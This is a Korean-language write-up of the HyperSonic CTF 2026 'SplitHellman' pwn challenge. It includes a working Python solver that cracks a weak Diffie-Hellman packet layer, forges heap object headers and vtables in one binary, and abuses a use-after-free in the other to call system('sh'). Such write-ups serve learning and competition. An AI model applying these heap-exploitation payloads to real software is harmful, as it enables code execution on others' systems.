---
title: "HyperSonic CTF 2026 SplitHellman Writeup"
published: 2026-06-08
description: "HyperSonic CTF 2026 SplitHellman 문제 풀이."
category: "CTF/Wargame"
tags: ["HyperSonic CTF", "CTF", "Writeup", "Pwnable"]
draft: false
listed: false
---

***SSG Writeup***

# SplitHellman

## 개요

`SplitHellman`은 Alice와 Bob 두 프로그램을 모두 공략해야 하는 pwn 문제입니다. 두 프로그램은 평문 명령을 바로 받지 않고, Diffie-Hellman 값으로 만든 키를 이용해 암호화된 패킷만 처리합니다.

확인한 조건은 다음과 같습니다.

- 분야: `pwnable`
- 제공된 프로그램: 심볼이 제거된 64비트 PIE ELF
- 목표: Alice와 Bob이 나누어 가진 flag 조각을 각각 얻은 뒤 합칩니다.

풀이에서 먼저 정리할 부분은 패킷 프로토콜입니다. `INFO`, `NEW`, `DISPATCH`, `DEL`, `FLUSH` 같은 명령은 모두 패킷 검증을 통과해야 실행됩니다. 따라서 정상적인 명령을 보낼 수 있는 클라이언트를 만든 뒤, Alice와 Bob에서 별도의 heap exploit을 구성합니다.

## 문제 분석

먼저 글에서 사용할 용어를 정리합니다.

- `server_pub`: 프로그램이 출력하는 Diffie-Hellman 공개값입니다. Alice에서는 `A`, Bob에서는 `B`로 출력됩니다.
- `peer_pub`: 공격자가 제출하는 공개값입니다.
- `shared`: `server_pub`과 공격자가 고른 private exponent로 계산한 공유값입니다.
- `enc_key`, `mac_key`, `obj_key`: `shared`와 nonce에서 파생되는 세션 키입니다.
- `nonce`: 패킷마다 붙는 64비트 값입니다.
- `object`: Alice에서 관리하는 heap 객체입니다.
- `note`: Bob에서 관리하는 사용자 데이터 객체입니다.
- `audit object`: Bob의 `FLUSH` 경로에서 참조하는 감사용 객체입니다.

두 프로그램은 시작할 때 다음 Diffie-Hellman 파라미터를 출력합니다.

```text
p = 401120980261
g = 2
```

`p`가 크지 않으므로 `server_pub = g^server_exp mod p`에서 `server_exp`를 baby-step giant-step으로 복구할 수 있습니다. 패킷 생성에는 공격자가 직접 고른 `peer_priv`로 다음 값을 계산하면 됩니다.

```text
peer_pub = g^peer_priv mod p
shared   = server_pub^peer_priv mod p
```

세션이 성립하면 명령은 다음 형식의 패킷으로 전송됩니다.

```text
<nonce> <len> <hex-ciphertext> <mac64-hex>
```

암호화와 MAC 계산은 다음 관계를 따릅니다.

```text
ciphertext = stream_xor(enc_key, nonce, plaintext)
mac = mac64(mac_key, nonce || len)
      XOR mac64(mac_key XOR 0xfeedfacecafebabe, ciphertext)
```

여기까지 구현하면 두 프로그램의 내부 명령을 일반 텍스트 명령처럼 사용할 수 있습니다.

Alice에서는 `INFO`가 PIE base와 `obj_key`를 계산할 수 있는 값을 노출합니다. 객체는 다음 형태로 해석할 수 있습니다.

```text
0x00: uint64 key
0x08: uint32 type
0x0c: uint32 size
0x10: uint64 auth
0x18: uint64 encrypted_vtable
0x20: data[]
```

`auth`는 객체 주소까지 포함해 계산됩니다. 그래서 객체 헤더를 위조하려면 PIE base뿐 아니라 heap 객체 주소도 필요합니다.

```python
def alice_obj_auth(obj_key, obj_addr, key, typ, size, enc_vtable):
    material = (
        p64(key)
        + p64(typ & 0xffffffff)
        + p64(size & 0xffffffff)
        + p64(enc_vtable)
        + p64(obj_addr)
    )
    return mac64(obj_key, material)


def alice_enc_ptr(obj_key, ptr):
    return rol(ptr ^ obj_key ^ 0x0B1EC7ED0B1EC7ED, 17)
```

이 구조 때문에 단순히 vtable pointer를 덮어쓰는 것만으로는 부족합니다. `auth`와 encrypted vtable pointer를 함께 맞춰야 합니다.

Bob에서는 `note` 데이터가 별도의 heap chunk에 할당됩니다. `DEL idx 1`을 사용하면 데이터용 heap chunk를 해제하면서도 닫힌 `note`가 세션 테이블에 남습니다. 이후 같은 크기의 `note`를 다시 할당하면, 이전 `note`가 가리키던 해제된 데이터 위치를 새 `note` 내용으로 채울 수 있습니다.

`FLUSH` 경로에서 사용하는 fake `audit object`는 다음처럼 구성할 수 있습니다.

```text
0x00: audit_auth
0x08: function pointer
0x10: command string
```

감사용 인증값은 다음 계산식과 맞아야 합니다.

```python
def bob_audit_auth(obj_key, func, cmd8):
    audit_key = obj_key ^ 0x0041756469744A6F62
    return mac64(audit_key, p64(func) + p64(cmd8) + p64(0xB0BAAD1700D))
```

## 핵심 아이디어

풀이 흐름은 패킷 계층과 heap exploit 계층으로 나누면 자연스럽습니다.

먼저 Diffie-Hellman handshake와 패킷 암호화, MAC을 구현해 명령 인터페이스에 접근합니다. 이후 `INFO`로 노출되는 값에서 PIE base와 `obj_key`를 얻고, 각 프로그램의 heap 구조에 맞춰 `system` 호출 지점까지 흐름을 연결합니다.

Alice에서는 route 기능을 이용해 인접 객체의 헤더를 고칩니다. `type 9` 객체를 크기 `0`으로 만들면 data pointer가 다음 heap chunk header와 맞닿습니다. 여기에 route copy를 걸면 다음 객체 헤더까지 덮을 수 있습니다. 이때 `auth`와 encrypted vtable pointer를 정확히 맞추면 `DISPATCH`가 admin vtable의 함수를 호출하고, 해당 함수가 객체 시작 주소를 `system`의 인자로 넘깁니다. 따라서 객체의 `key` 위치에 `sh`를 넣으면 shell을 열 수 있습니다.

Bob에서는 닫힌 `note`가 해제된 데이터 pointer를 계속 들고 있는 점을 이용합니다. 같은 크기의 `note`를 다시 만들어 해당 heap chunk를 fake `audit object`로 채운 뒤, `CLOSE`와 `RESUME`으로 세션 상태를 맞춥니다. 그 다음 `FLUSH`를 호출하면 fake `audit object`의 function pointer가 실행됩니다. function pointer에는 `system` wrapper를 넣고, `0x10` 오프셋에 명령 문자열을 둡니다.

## 풀이 과정

### Step 1. 암호화된 명령 패킷 생성

처음에는 프로그램이 출력하는 `p`, `g`, `A` 또는 `B`, `server_nonce`를 읽습니다. 공격자는 임의의 `peer_priv`를 고르고 그에 대응하는 `peer_pub`을 제출합니다. 그 뒤 `shared`를 계산하고 키 스케줄을 그대로 구현하면 `enc_key`, `mac_key`, `obj_key`를 얻습니다.

```text
master = derive_master(role_magic, server_pub, peer_pub,
                       shared, client_nonce, server_nonce)

enc_key, mac_key, obj_key = derive_keys(master)
```

이 단계의 결과로 `INFO`와 같은 내부 명령을 보낼 수 있습니다. 이후 exploit은 모두 이 패킷 생성 루틴 위에서 실행됩니다.

### Step 2. Alice 객체 위조에 필요한 leak 정리

Alice의 `INFO` 응답에는 PIE base와 `obj_key`를 계산할 수 있는 값이 들어 있습니다.

```python
info = c.send_cmd("INFO")
vals = qwords(info)
base = vals[0] - 0x6030
obj_key = vals[2] ^ 0xABAD1DEA
```

객체 `auth`에는 객체 주소가 들어가므로 heap 주소도 필요합니다. `type 3` 객체를 만든 뒤 `DISPATCH`를 호출하면 이후 할당 주소를 계산할 수 있는 heap 객체 주소를 얻을 수 있습니다.

```python
c.send_cmd(f"NEW 0 4369 3 3 24 {hexarg(b'A' * 0x18)}")
leak = c.send_cmd("DISPATCH 0")
leak_obj = qwords(leak)[2]
```

이 값으로 route copy의 목적지와 변조할 victim 객체 주소를 계산합니다.

### Step 3. Alice route copy로 vtable 교체

Alice에서 사용할 primitive는 다음 세 가지입니다.

```text
type 1: 입력 데이터를 전역 route buffer에 복사
type 2: route buffer를 등록된 목적지 pointer로 복사
type 9, size 0: data pointer가 다음 heap chunk header와 맞닿는 객체 생성
```

`type 9` 객체의 data pointer를 route 목적지로 등록하고, route buffer를 통해 다음 객체의 헤더를 덮습니다. payload는 먼저 heap chunk header를 복구한 뒤 victim 객체의 `key`, `type`, `size`, `auth`, `encrypted_vtable`을 차례대로 배치합니다.

```text
payload =
    repaired heap chunk header
    forged object key
    forged type and size
    forged auth
    forged encrypted vtable
```

vtable은 admin vtable을 가리키도록 암호화합니다. forged 객체의 첫 8바이트에는 `system`에 넘길 명령 문자열을 넣습니다. 이후 `DISPATCH`를 호출하면 vtable의 첫 함수가 실행되고 shell을 얻습니다.

### Step 4. Bob `note`의 해제된 데이터 pointer 재사용

Bob에서는 `NEW`로 `note`를 만든 뒤 `DEL idx 1`을 호출합니다. 이 경로는 데이터용 heap chunk를 해제하지만 `note` 자체를 세션 테이블에서 지우지 않고 닫힌 상태로 남깁니다.

그 다음 같은 크기의 `note`를 다시 만들면 allocator가 방금 해제된 heap chunk를 재사용합니다. 이전 `note`는 여전히 그 주소를 가리키므로, 새 `note`의 내용이 이전 `note` 관점에서는 fake `audit object`가 됩니다.

```text
1. NEW로 note 생성
2. DEL idx 1로 데이터용 heap chunk 해제
3. 같은 크기의 NEW로 해제된 heap chunk 재사용
4. 재사용된 heap chunk에 fake audit object 배치
```

이때 fake `audit object`에는 `audit_auth`, `system` wrapper 주소, 명령 문자열이 들어갑니다.

### Step 5. Bob audit 경로에서 function pointer 호출

Bob의 `FLUSH`는 세션 상태가 맞아야 audit 경로까지 도달합니다. 따라서 fake `audit object`를 준비한 뒤 `CLOSE`와 `RESUME`을 순서대로 호출합니다.

```text
CLOSE
RESUME 305419896
FLUSH
```

`INFO`에서 얻은 leak으로 base와 `obj_key`를 계산하고, `system` wrapper 주소에 맞춰 `audit_auth`를 만듭니다. Bob은 실행 대상에 따라 일부 오프셋이 달라질 수 있었으므로, exploit에서는 `audit_buf` leak을 기준으로 가능한 오프셋 집합을 선택하도록 처리했습니다.

## Exploit / Solver

최종 exploit은 세 부분으로 구성됩니다.

1. Diffie-Hellman handshake와 패킷 암호화, MAC 구현
2. Alice 객체 헤더 위조
3. Bob fake `audit object` 구성

아래 코드는 핵심 루틴만 정리한 것입니다. 연결 처리와 입출력 래퍼는 생략하고, `send_cmd`는 평문 명령을 암호화된 패킷으로 보내는 함수라고 두겠습니다.

```python
import struct


MASK = (1 << 64) - 1
P = 0x5D64AC6D25
G = 2


def u64(x):
    return x & MASK


def p64(x):
    return struct.pack("<Q", u64(x))


def rol(x, n):
    x = u64(x)
    return u64((x << n) | (x >> (64 - n)))


def splitmix_next(state):
    state = u64(state + 0x9E3779B97F4A7C15)
    z = state
    z = u64((z ^ (z >> 30)) * 0xBF58476D1CE4E5B9)
    z = u64((z ^ (z >> 27)) * 0x94D049BB133111EB)
    z = u64(z ^ (z >> 31))
    return state, z


def shash(data, seed):
    h = u64(0xCBF29CE484222325 ^ seed)
    for b in data:
        h ^= b
        h = u64(h * 0x100000001B3)
        h ^= h >> 32
    h ^= u64(len(data) * 0x9E3779B97F4A7C15)
    return splitmix_next(h)[1]


def mac64(key, data):
    a = shash(data, key ^ 0x6D61635F6B657931)
    b = shash(p64(key), 0xABCDEF0123456789)
    return rol(key ^ a ^ b, 17)


def stream_xor(enc_key, nonce, data):
    state = u64(rol(nonce, 13) ^ enc_key ^ 0x7873747265616D21)
    out = bytearray(data)
    block = b""
    for i in range(len(out)):
        if (i & 7) == 0:
            state, word = splitmix_next(state)
            block = p64(word)
        out[i] ^= block[i & 7]
    return bytes(out)


def make_packet(enc_key, mac_key, nonce, plaintext):
    if isinstance(plaintext, str):
        plaintext = plaintext.encode()
    ciphertext = stream_xor(enc_key, nonce, plaintext)
    tag = mac64(mac_key, p64(nonce) + p64(len(ciphertext)))
    tag ^= mac64(mac_key ^ 0xFEEDFACECAFEBABE, ciphertext)
    return f"{nonce} {len(ciphertext)} {ciphertext.hex()} {tag:016x}\n".encode()


def derive_master(role_magic, server_pub, peer_pub, shared,
                  client_nonce, server_nonce):
    material = b"".join(
        p64(x)
        for x in (role_magic, P, G, server_pub, peer_pub,
                  client_nonce, server_nonce)
    )
    salt = shash(material, 0x53504C495448454C)
    return shash(p64(shared) + p64(salt), 0x48454C4C4D414E31)


def derive_keys(master):
    enc = shash(p64(master) + p64(0x656E63), 0x1111111111111111)
    mac = shash(p64(master) + p64(0x6D6163), 0x2222222222222222)
    obj = shash(p64(master) + p64(0x6F626A), 0x3333333333333333)
    return enc, mac, obj


def alice_obj_auth(obj_key, obj_addr, key, typ, size, enc_vtable):
    material = (
        p64(key)
        + p64(typ & 0xffffffff)
        + p64(size & 0xffffffff)
        + p64(enc_vtable)
        + p64(obj_addr)
    )
    return mac64(obj_key, material)


def alice_enc_ptr(obj_key, ptr):
    return rol(ptr ^ obj_key ^ 0x0B1EC7ED0B1EC7ED, 17)


def bob_audit_auth(obj_key, func, cmd8):
    audit_key = obj_key ^ 0x0041756469744A6F62
    return mac64(audit_key, p64(func) + p64(cmd8) + p64(0xB0BAAD1700D))


def qwords(data):
    size = len(data) // 8
    return struct.unpack("<" + "Q" * size, data[:size * 8])


def hexarg(data):
    return "0x" + data.hex()


def exploit_alice(c, command=b"sh\x00"):
    info = c.send_cmd("INFO")
    vals = qwords(info)
    base = vals[0] - 0x6030
    obj_key = vals[2] ^ 0xABAD1DEA

    c.send_cmd(f"NEW 0 4369 3 3 24 {hexarg(b'A' * 0x18)}")
    leak = c.send_cmd("DISPATCH 0")
    leak_obj = qwords(leak)[2]

    target_a = leak_obj + 0xB0
    victim_b = target_a + 0x30
    admin_vtable = base + 0x6020
    enc_vtable = alice_enc_ptr(obj_key, admin_vtable)

    key = int.from_bytes(command[:8].ljust(8, b"\x00"), "little")
    typ = 1
    size = 0
    auth = alice_obj_auth(obj_key, victim_b, key, typ, size, enc_vtable)

    c.send_cmd(f"NEW 1 1229782938247303441 9 9 0 {hexarg(b'')}")
    c.send_cmd(f"NEW 2 {key} {typ} {typ} 0 {hexarg(b'')}")
    c.send_cmd("REGISTER 0 1")

    payload = p64(0) + p64(0x71)
    payload += p64(key) + struct.pack("<II", typ, size)
    payload += p64(auth) + p64(enc_vtable)
    payload = payload.ljust(0x40, b"\x00")

    logdata = struct.pack("<I", len(payload)) + payload
    c.send_cmd(f"NEW 3 13107 1 1 {len(logdata)} {hexarg(logdata)}")

    routedata = b"\x00" * 8 + p64(len(payload)) + p64(target_a + 0x20)
    c.send_cmd(f"NEW 4 17476 2 2 {len(routedata)} {hexarg(routedata)}")

    c.send_cmd("DISPATCH 3")
    c.send_cmd("DISPATCH 4")
    c.send_cmd("DISPATCH 2", want_reply=False)


def exploit_bob(c, command=b"sh\x00"):
    info = c.send_cmd("INFO")
    sess, stderr_ptr, audit_buf, key_xor, marker = qwords(info)[:5]

    if ((audit_buf - 0x60E0) & 0xFFF) == 0:
        base = audit_buf - 0x60E0
        system_wrapper_off = 0x1356
    elif ((audit_buf - 0x6100) & 0xFFF) == 0:
        base = audit_buf - 0x6100
        system_wrapper_off = 0x136E
    else:
        raise RuntimeError("unknown offset set")

    obj_key = key_xor ^ 0xBEEFB0B
    system_wrapper = base + system_wrapper_off
    cmd8 = int.from_bytes(command[:8].ljust(8, b"\x00"), "little")

    fake = p64(bob_audit_auth(obj_key, system_wrapper, cmd8))
    fake += p64(system_wrapper)
    fake += command[:8].ljust(8, b"\x00")
    fake += b"\x00" * 0x20

    size = 0x418
    c.send_cmd(f"NEW 0 4919 {size} {hexarg(b'A' * 0x20)}")
    c.send_cmd("DEL 0 1")
    c.send_cmd(f"NEW 1 8738 {size} {hexarg(fake)}")
    c.send_cmd("CLOSE")
    c.send_cmd("RESUME 305419896")
    c.send_cmd("FLUSH", want_reply=False)
```

Alice와 Bob 모두 최종 호출에는 `sh`를 사용했습니다. 이후 열린 shell에서 각 프로그램이 가진 flag 조각을 읽으면 됩니다.

## 결과

Alice에서 얻은 조각은 다음과 같습니다.

```text
HS{alice_and_bob_agreed_on_a_secret_
```

Bob에서 얻은 조각은 다음과 같습니다.

```text
but_forgot_to_check_the_subgroup}
```

두 조각을 이어 붙인 최종 flag입니다.

```text
HS{alice_and_bob_agreed_on_a_secret_but_forgot_to_check_the_subgroup}
```
